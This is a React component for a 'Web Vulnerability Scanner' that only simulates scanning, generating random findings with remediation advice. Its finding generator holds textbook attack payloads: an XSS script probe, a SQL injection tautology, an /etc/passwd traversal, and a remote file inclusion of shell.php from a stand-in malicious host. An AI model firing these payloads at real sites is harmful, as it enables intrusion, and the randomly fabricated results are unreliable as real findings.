import React, { useState, useEffect } from 'react';

const WebVulnerabilityScanner = () => {
  const [targetUrl, setTargetUrl] = useState('');
  const [scanDepth, setScanDepth] = useState(2);
  const [scanOptions, setScanOptions] = useState({
    xss: true,
    sqlInjection: true,
    csrf: true,
    openRedirect: true,
    directoryTraversal: true,
    fileInclusion: true
  });
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanResults, setScanResults] = useState([]);
  const [scanSummary, setScanSummary] = useState({
    vulnerabilitiesFound: 0,
    highRisk: 0,
    mediumRisk: 0,
    lowRisk: 0,
    urlsScanned: 0
  });
  const [logs, setLogs] = useState([]);
  const [showWarning, setShowWarning] = useState(true);
  const [confirmedLegal, setConfirmedLegal] = useState(false);

  // Vulnerability types with descriptions
  const vulnerabilityTypes = [
    { id: 'xss', name: 'Cross-Site Scripting (XSS)', description: 'Detects XSS vulnerabilities where malicious scripts can be injected into web pages', risk: 'high' },
    { id: 'sqlInjection', name: 'SQL Injection', description: 'Identifies SQL injection points where database queries can be manipulated', risk: 'high' },
    { id: 'csrf', name: 'Cross-Site Request Forgery', description: 'Detects missing CSRF tokens that could allow attackers to perform actions as authenticated users', risk: 'medium' },
    { id: 'openRedirect', name: 'Open Redirect', description: 'Finds unvalidated redirects that can be used in phishing attacks', risk: 'medium' },
    { id: 'directoryTraversal', name: 'Directory Traversal', description: 'Identifies paths that allow access to files outside the web root directory', risk: 'high' },
    { id: 'fileInclusion', name: 'File Inclusion', description: 'Detects remote or local file inclusion vulnerabilities', risk: 'high' }
  ];

  // Update scan progress
  useEffect(() => {
    let timer;
    if (isScanning && scanProgress < 100) {
      timer = setTimeout(() => {
        const increment = Math.floor(Math.random() * 5) + 1;
        const newProgress = Math.min(scanProgress + increment, 100);
        setScanProgress(newProgress);
        
        // Simulate finding vulnerabilities during scan
        if (Math.random() > 0.85) {
          simulateFindingVulnerability();
        }
        
        // Update scan summary
        setScanSummary(prev => ({
          ...prev,
          urlsScanned: prev.urlsScanned + Math.floor(Math.random() * 3) + 1
        }));
        
        // Add log entry
        if (newProgress % 10 === 0 || (newProgress > 90 && newProgress % 5 === 0)) {
          addLogEntry(`Scanning progress: ${newProgress}%`);
        }
        
        // Complete scan when progress reaches 100%
        if (newProgress === 100) {
          completeScan();
        }
      }, 500);
    }
    
    return () => clearTimeout(timer);
  }, [isScanning, scanProgress]);

  // Add a log entry with timestamp
  const addLogEntry = (message) => {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    setLogs(prevLogs => [{ timestamp, message }, ...prevLogs].slice(0, 100)); // Keep last 100 logs
  };

  // Simulate finding a vulnerability
  const simulateFindingVulnerability = () => {
    // Get enabled vulnerability types
    const enabledVulnerabilities = vulnerabilityTypes.filter(v => scanOptions[v.id]);
    
    if (enabledVulnerabilities.length === 0) return;
    
    // Randomly select a vulnerability type from enabled ones
    const randomVulnerability = enabledVulnerabilities[Math.floor(Math.random() * enabledVulnerabilities.length)];
    
    // Generate a random path for the vulnerability
    const paths = [
      '/login',
      '/search',
      '/profile',
      '/admin',
      '/products',
      '/cart',
      '/checkout',
      '/contact',
      '/api/users',
      '/api/products'
    ];
    const randomPath = paths[Math.floor(Math.random() * paths.length)];
    
    // Generate random parameters based on vulnerability type
    let payload = '';
    let description = '';
    
    switch (randomVulnerability.id) {
      case 'xss':
        payload = `${randomPath}?q=<script>alert('XSS')</script>`;
        description = 'Unsanitized user input is reflected in the response';
        break;
      case 'sqlInjection':
        payload = `${randomPath}?id=1' OR '1'='1`;
        description = 'SQL query parameters are not properly sanitized';
        break;
      case 'csrf':
        payload = randomPath;
        description = 'Form submission lacks CSRF token protection';
        break;
      case 'openRedirect':
        payload = `${randomPath}?redirect=https://malicious-site.com`;
        description = 'Redirect parameter is not validated';
        break;
      case 'directoryTraversal':
        payload = `${randomPath}?file=../../../etc/passwd`;
        description = 'Path traversal in file parameter';
        break;
      case 'fileInclusion':
        payload = `${randomPath}?include=http://malicious-site.com/shell.php`;
        description = 'Remote file inclusion vulnerability';
        break;
      default:
        payload = randomPath;
        description = 'Potential security issue detected';
    }
    
    // Create vulnerability object
    const newVulnerability = {
      id: Date.now(),
      type: randomVulnerability.name,
      risk: randomVulnerability.risk,
      url: `${targetUrl}${payload}`,
      description,
      details: `The ${randomVulnerability.name} vulnerability was detected at ${targetUrl}${payload}. ${description}.`,
      remediation: getRemediationAdvice(randomVulnerability.id)
    };
    
    // Add to results
    setScanResults(prev => [...prev, newVulnerability]);
    
    // Update summary
    setScanSummary(prev => ({
      ...prev,
      vulnerabilitiesFound: prev.vulnerabilitiesFound + 1,
      highRisk: randomVulnerability.risk === 'high' ? prev.highRisk + 1 : prev.highRisk,
      mediumRisk: randomVulnerability.risk === 'medium' ? prev.mediumRisk + 1 : prev.mediumRisk,
      lowRisk: randomVulnerability.risk === 'low' ? prev.lowRisk + 1 : prev.lowRisk
    }));
    
    // Add log entry
    addLogEntry(`Found ${randomVulnerability.risk} risk ${randomVulnerability.name} vulnerability at ${payload}`);
  };

  // Get remediation advice based on vulnerability type
  const getRemediationAdvice = (vulnerabilityType) => {
    switch (vulnerabilityType) {
      case 'xss':
        return 'Implement proper input validation and output encoding. Use Content-Security-Policy headers and consider frameworks that automatically escape output.';
      case 'sqlInjection':
        return 'Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries. Implement least privilege database accounts.';
      case 'csrf':
        return 'Implement anti-CSRF tokens in all forms and state-changing requests. Use the SameSite cookie attribute and consider implementing the Double Submit Cookie pattern.';
      case 'openRedirect':
        return 'Validate all redirect URLs against a whitelist or use relative path redirects. Avoid using user-supplied input for redirect destinations.';
      case 'directoryTraversal':
        return 'Validate and sanitize file paths. Use a whitelist of allowed files and avoid passing user-supplied input to filesystem operations.';
      case 'fileInclusion':
        return 'Avoid using user input for file inclusions. If necessary, validate against a whitelist of allowed files and use proper path sanitization.';
      default:
        return 'Implement proper input validation, output encoding, and follow the principle of least privilege.';
    }
  };

  // Start the scan
  const startScan = () => {
    if (!targetUrl || !confirmedLegal) return;
    
    setIsScanning(true);
    setScanProgress(0);
    setScanResults([]);
    setScanSummary({
      vulnerabilitiesFound: 0,
      highRisk: 0,
      mediumRisk: 0,
      lowRisk: 0,
      urlsScanned: 0
    });
    
    // Clear previous logs
    setLogs([]);
    
    // Add initial log entries
    addLogEntry(`Starting vulnerability scan on ${targetUrl}`);
    addLogEntry(`Scan depth: ${scanDepth}`);
    
    const enabledVulnerabilities = Object.entries(scanOptions)
      .filter(([_, enabled]) => enabled)
      .map(([id]) => id);
    
    addLogEntry(`Enabled tests: ${enabledVulnerabilities.join(', ')}`);
    addLogEntry('Crawling site structure...');
    
    // Simulate crawling delay
    setTimeout(() => {
      addLogEntry('Site crawling completed, beginning vulnerability tests');
    }, 2000);
  };

  // Complete the scan
  const completeScan = () => {
    setIsScanning(false);
    addLogEntry('Scan completed');
    addLogEntry(`Found ${scanSummary.vulnerabilitiesFound} vulnerabilities (${scanSummary.highRisk} high, ${scanSummary.mediumRisk} medium, ${scanSummary.lowRisk} low risk)`);
  };

  // Stop the scan
  const stopScan = () => {
    setIsScanning(false);
    addLogEntry('Scan stopped by user');
  };

  // Toggle a scan option
  const toggleScanOption = (optionId) => {
    setScanOptions(prev => ({
      ...prev,
      [optionId]: !prev[optionId]
    }));
  };

  // Get risk level badge color
  const getRiskColor = (risk) => {
    switch (risk) {
      case 'high': return 'bg-red-600/20 text-red-400';
      case 'medium': return 'bg-yellow-600/20 text-yellow-400';
      case 'low': return 'bg-blue-600/20 text-blue-400';
      default: return 'bg-gray-600/20 text-gray-400';
    }
  };

  return (
    <div className="bg-secondary rounded-lg shadow-lg p-6 mb-8">
      <h2 className="text-2xl font-bold text-white mb-6 flex items-center">
        <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2 text-blue-500" viewBox="0 0 20 20" fill="currentColor">
          <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
        </svg>
        Web Vulnerability Scanner
      </h2>
      
      {/* Legal Warning */}
      {showWarning && (
        <div className="bg-blue-900/30 border border-blue-700 rounded-lg p-4 mb-6">
          <div className="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-blue-500 mr-3 flex-shrink-0 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
              <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
            </svg>
            <div>
              <h3 className="text-lg font-semibold text-blue-400 mb-2">Legal Warning</h3>
              <p className="text-gray-300 mb-3">
                This tool is provided for educational and authorized security testing purposes only. Unauthorized vulnerability scanning is illegal and unethical.
                Only use this tool against systems you own or have explicit permission to test.
              </p>
              <div className="flex items-center">
                <input 
                  type="checkbox" 
                  id="legal-confirmation-vuln" 
                  checked={confirmedLegal}
                  onChange={() => setConfirmedLegal(!confirmedLegal)}
                  className="mr-2"
                />
                <label htmlFor="legal-confirmation-vuln" className="text-gray-300 text-sm">
                  I confirm I will only use this tool for legal and authorized testing
                </label>
              </div>
              <div className="mt-3 flex justify-end">
                <button 
                  onClick={() => setShowWarning(false)}
                  className="bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm"
                >
                  Acknowledge
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Configuration Panel */}
        <div className="lg:col-span-1 bg-gray-900 rounded-lg p-4">
          <h3 className="text-lg font-semibold text-white mb-4">Scan Configuration</h3>
          
          <div className="space-y-4">
            <div>
              <label className="block text-gray-300 mb-2">Target URL</label>
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://example.com"
                className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded text-white focus:outline-none focus:border-accent"
                disabled={isScanning}
              />
            </div>
            
            <div>
              <label className="block text-gray-300 mb-2">Scan Depth</label>
              <select
                value={scanDepth}
                onChange={(e) => setScanDepth(parseInt(e.target.value))}
                className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded text-white focus:outline-none focus:border-accent"
                disabled={isScanning}
              >
                <option value="1">Shallow (faster)</option>
                <option value="2">Normal</option>
                <option value="3">Deep (slower)</option>
              </select>
              <p className="text-xs text-gray-500 mt-1">
                Deeper scans find more vulnerabilities but take longer to complete
              </p>
            </div>
            
            <div>
              <label className="block text-gray-300 mb-2">Vulnerability Tests</label>
              <div className="space-y-2 bg-gray-800 p-3 rounded">
                {vulnerabilityTypes.map(vulnerability => (
                  <div key={vulnerability.id} className="flex items-center">
                    <input
                      type="checkbox"
                      id={`vuln-${vulnerability.id}`}
                      checked={scanOptions[vulnerability.id]}
                      onChange={() => toggleScanOption(vulnerability.id)}
                      disabled={isScanning}
                      className="mr-2"
                    />
                    <label htmlFor={`vuln-${vulnerability.id}`} className="flex items-center text-sm">
                      <span className="text-white">{vulnerability.name}</span>
                      <span className={`ml-2 text-xs px-2 py-0.5 rounded-full ${getRiskColor(vulnerability.risk)}`}>
                        {vulnerability.risk}
                      </span>
                    </label>
                  </div>
                ))}
              </div>
            </div>
            
            <div className="pt-4">
              {!isScanning ? (
                <button
                  onClick={startScan}
                  disabled={!targetUrl || !confirmedLegal}
                  className={`w-full py-2 px-4 rounded font-medium ${!targetUrl || !confirmedLegal ? 'bg-gray-700 text-gray-500 cursor-not-allowed' : 'bg-blue-700 hover:bg-blue-600 text-white'}`}
                >
                  Start Scan
                </button>
              ) : (
                <button
                  onClick={stopScan}
                  className="w-full py-2 px-4 bg-gray-700 hover:bg-gray-600 text-white rounded font-medium"
                >
                  Stop Scan
                </button>
              )}
            </div>
          </div>
        </div>
        
        {/* Scan Status and Results */}
        <div className="lg:col-span-2 bg-gray-900 rounded-lg p-4">
          {/* Progress Bar */}
          <div className="mb-6">
            <div className="flex justify-between items-center mb-2">
              <h3 className="text-lg font-semibold text-white">Scan Status</h3>
              {isScanning && (
                <div className="flex items-center">
                  <div className="animate-pulse w-3 h-3 bg-blue-500 rounded-full mr-2"></div>
                  <span className="text-blue-400 font-medium">SCAN IN PROGRESS</span>
                </div>
              )}
            </div>
            <div className="w-full bg-gray-800 rounded-full h-2.5">
              <div 
                className="bg-blue-600 h-2.5 rounded-full" 
                style={{ width: `${scanProgress}%` }}
              ></div>
            </div>
            <div className="flex justify-between text-xs text-gray-500 mt-1">
              <span>{scanProgress}% Complete</span>
              <span>{scanSummary.urlsScanned} URLs scanned</span>
            </div>
          </div>
          
          {/* Scan Summary */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
            <div className="bg-gray-800 rounded-lg p-3">
              <div className="text-gray-400 text-sm mb-1">Vulnerabilities</div>
              <div className="text-xl font-bold text-white">{scanSummary.vulnerabilitiesFound}</div>
            </div>
            <div className="bg-gray-800 rounded-lg p-3">
              <div className="text-gray-400 text-sm mb-1">High Risk</div>
              <div className="text-xl font-bold text-red-500">{scanSummary.highRisk}</div>
            </div>
            <div className="bg-gray-800 rounded-lg p-3">
              <div className="text-gray-400 text-sm mb-1">Medium Risk</div>
              <div className="text-xl font-bold text-yellow-500">{scanSummary.mediumRisk}</div>
            </div>
            <div className="bg-gray-800 rounded-lg p-3">
              <div className="text-gray-400 text-sm mb-1">Low Risk</div>
              <div className="text-xl font-bold text-blue-500">{scanSummary.lowRisk}</div>
            </div>
          </div>
          
          {/* Tabs for Results and Logs */}
          <div className="mb-4">
            <div className="flex border-b border-gray-800">
              <button 
                className="py-2 px-4 text-white border-b-2 border-blue-500 font-medium"
              >
                Vulnerabilities
              </button>
            </div>
          </div>
          
          {/* Vulnerability Results */}
          <div className="bg-gray-800 rounded-lg p-2 overflow-y-auto" style={{ maxHeight: '400px' }}>
            {scanResults.length > 0 ? (
              <div className="space-y-3">
                {scanResults.map(vulnerability => (
                  <div key={vulnerability.id} className={`border-l-4 ${vulnerability.risk === 'high' ? 'border-red-500' : vulnerability.risk === 'medium' ? 'border-yellow-500' : 'border-blue-500'} bg-gray-900 p-3 rounded-r`}>
                    <div className="flex justify-between items-start">
                      <h4 className="font-medium text-white">{vulnerability.type}</h4>
                      <span className={`text-xs px-2 py-0.5 rounded-full ${getRiskColor(vulnerability.risk)}`}>
                        {vulnerability.risk} risk
                      </span>
                    </div>
                    <div className="text-sm text-gray-400 mt-1 break-all">{vulnerability.url}</div>
                    <p className="text-sm text-gray-300 mt-2">{vulnerability.description}</p>
                    <div className="mt-3">
                      <h5 className="text-sm font-medium text-white mb-1">Remediation:</h5>
                      <p className="text-xs text-gray-400">{vulnerability.remediation}</p>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-gray-500 italic text-center py-8">
                {isScanning ? 'Scanning for vulnerabilities...' : 'No vulnerabilities found yet. Start a scan to detect security issues.'}
              </div>
            )}
          </div>
          
          {/* Scan Logs */}
          <div className="mt-6">
            <h4 className="font-medium text-white mb-2">Scan Logs</h4>
            <div className="bg-black rounded-lg p-2 h-32 overflow-y-auto font-mono text-xs">
              {logs.length > 0 ? (
                logs.map((log, index) => (
                  <div key={index} className="mb-1">
                    <span className="text-gray-500">[{log.timestamp}]</span> <span className="text-blue-400">{log.message}</span>
                  </div>
                ))
              ) : (
                <div className="text-gray-500 italic">No logs yet. Start a scan to see activity.</div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WebVulnerabilityScanner;